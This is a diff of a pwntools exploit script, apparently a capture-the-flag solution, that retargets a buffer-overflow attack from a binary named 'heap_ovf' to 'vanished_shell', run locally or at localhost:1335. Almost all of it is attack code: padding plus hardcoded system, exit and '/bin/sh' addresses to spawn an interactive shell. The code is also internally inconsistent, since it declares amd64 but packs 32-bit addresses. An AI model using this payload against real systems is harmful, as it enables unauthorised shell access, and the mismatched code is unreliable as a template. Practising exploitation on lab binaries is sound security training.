@@ -11,21 +11,19 @@ context(arch="amd64", endian='el', os="linux")
 context.log_level = "debug"
 
 if args.mode in ["d", "debug"]:
-    atk = process('./heap_ovf')
+    atk = process('./vanished_shell')
     #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
-    chall = ELF('./heap_ovf', checksec=True)
+    chall = ELF('./vanished_shell', checksec=True)
 else:
     atk = remote('localhost', 1335)
     #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
     chall = None
 
 # Payloads
-payload = b"A" * 32 + p64(0x403360)
-payload2 = p64(0x4011b6)
-
-offset = b'A' * 72
+offset = b"A" * 64
 payload_system = p32(0xf7dd38e0)
 payload_exit = p32(0xf7dc25b0)
 payload_sh = p32(0xf7f40de8)
-p.sendline(offset + payload_system + payload_exit + payload_sh)
-p.interactive()
+atk.recvuntil(b"What do you want to solve?")
+atk.sendline(offset + payload_system + payload_exit + payload_sh)
+atk.interactive()
